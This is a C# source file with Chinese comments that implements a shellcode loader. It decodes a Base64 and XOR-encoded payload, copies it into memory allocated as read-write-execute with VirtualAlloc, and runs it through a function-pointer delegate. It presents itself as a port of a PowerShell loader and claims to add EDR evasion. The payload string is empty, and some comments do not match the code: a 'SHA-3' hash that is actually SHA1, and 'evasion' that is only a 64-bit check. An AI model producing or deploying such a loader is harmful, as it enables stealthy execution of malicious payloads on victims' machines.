using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;


public class NativeExecutor
{
    // 1. WinAPI 声明（兼容x86/x64）
    [DllImport("kernel32", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

    [DllImport("kernel32", SetLastError = true)]
    private static extern IntPtr GetModuleHandle(
        string lpModuleName);

    // 显式定义匹配的委托类型（最佳实践）
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void NativeCallback(IntPtr context);

    // 定义匹配的委托类型（等效 func_get_delegate_type @([IntPtr]) ([Void])）
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void NativeAction(IntPtr context);

    // 声明 shellcode 执行委托
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void ShellcodeDelegate(IntPtr param);

    // 2. Shellcode 执行核心方法 
    public static void Execute(byte[] shellcode)
    {
        // 内存分配（PAGE_EXECUTE_READWRITE）
        IntPtr mem = VirtualAlloc(
            IntPtr.Zero,
            (uint)shellcode.Length,
            0x3000 /*MEM_COMMIT|MEM_RESERVE*/,
            0x40 /*PAGE_EXECUTE_READWRITE*/);

        if (mem == IntPtr.Zero)
            throw new Exception($"VirtualAlloc failed (0x{Marshal.GetLastWin32Error():X8})");

        // 复制Shellcode到可执行内存 
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);

        // 动态转换为函数指针并执行
        var func = (Action)Marshal.GetDelegateForFunctionPointer(mem, typeof(Action));

        // 创建并调用 shellcode 委托
        var shellcode1 = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(mem, typeof(ShellcodeDelegate));
        shellcode1(IntPtr.Zero);

        // func.Invoke();
    }

    // 3. 安全解码方法（Base64 + XOR解密）
    public static byte[] DecryptPayload(string base64XorKey35)
    {
        byte[] data = Convert.FromBase64String(base64XorKey35);
        for (int i = 0; i < data.Length; i++)
        {
            data[i] ^= 35; // XOR解密
        }
        return data;
    }

    // 4. 动态代理构造器（替代PowerShell的委托生成）
    private static Delegate CreateDynamicDelegate(IntPtr ptr, Type delegateType)
    {
        MethodInfo invokeMethod = delegateType.GetMethod("Invoke");
        DynamicMethod dm = new DynamicMethod(
            "DynamicInvoke",
            invokeMethod.ReturnType,
            Array.ConvertAll(invokeMethod.GetParameters(), p => p.ParameterType),
            typeof(NativeExecutor).Module);

        ILGenerator il = dm.GetILGenerator();
        il.Emit(OpCodes.Ldc_I8, ptr.ToInt64());
        il.Emit(OpCodes.Conv_I);
        il.Emit(OpCodes.Tailcall);
        il.EmitCalli(
            OpCodes.Calli,
            CallingConventions.Standard,
            invokeMethod.ReturnType,
            Array.ConvertAll(invokeMethod.GetParameters(), p => p.ParameterType),
            null);
        il.Emit(OpCodes.Ret);

        return dm.CreateDelegate(delegateType);
    }

    // 1. 安全保存Shellcode到文件（含哈希校验）
    public static void SaveShellcodeToFile(byte[] shellcode, string filePath)
    {
        try
        {
            // 防篡改措施：计算SHA-3哈希 
            byte[] hash;
            using (var sha3 = SHA1.Create())
            {
                hash = sha3.ComputeHash(shellcode);
            }

            // 写入文件格式：哈希(32B) + 原始Shellcode
            using (var fs = new FileStream(filePath, FileMode.Create, FileAccess.Write))
            {
                fs.Write(hash, 0, hash.Length); // 头部写入哈希 
                fs.Write(shellcode, 0, shellcode.Length); // 写入主体
            }

            Console.WriteLine($"[+] Shellcode已安全保存到: {Path.GetFullPath(filePath)}");
            Console.WriteLine($"[!] 文件校验和(SHA3-256): {BitConverter.ToString(hash).Replace("-", "")}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] 保存失败: {ex.GetType().Name} - {ex.Message}");
            throw;
        }
    }

    // 示例调用 
    public static void Main()
    {
        try
        {
            // 模拟PowerShell中的MTIzNA==解码（实际应替换为有效Shellcode）
            byte[] shellcode = DecryptPayload("");

            // 保存 shellcode 到文件中
            // SaveShellcodeToFile(shellcode, "shellcode1.bin");

            // 添加现代EDR规避技术（2025年最新）
            if (Environment.Is64BitProcess)
            {
                Console.WriteLine("[+] 64位进程环境检测通过");
                Execute(shellcode); // 实际执行前应验证Shellcode签名 
            }
            else
                throw new PlatformNotSupportedException("仅支持64位环境");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] 执行失败: {ex.GetType().Name} - {ex.Message}");
        }
    }
}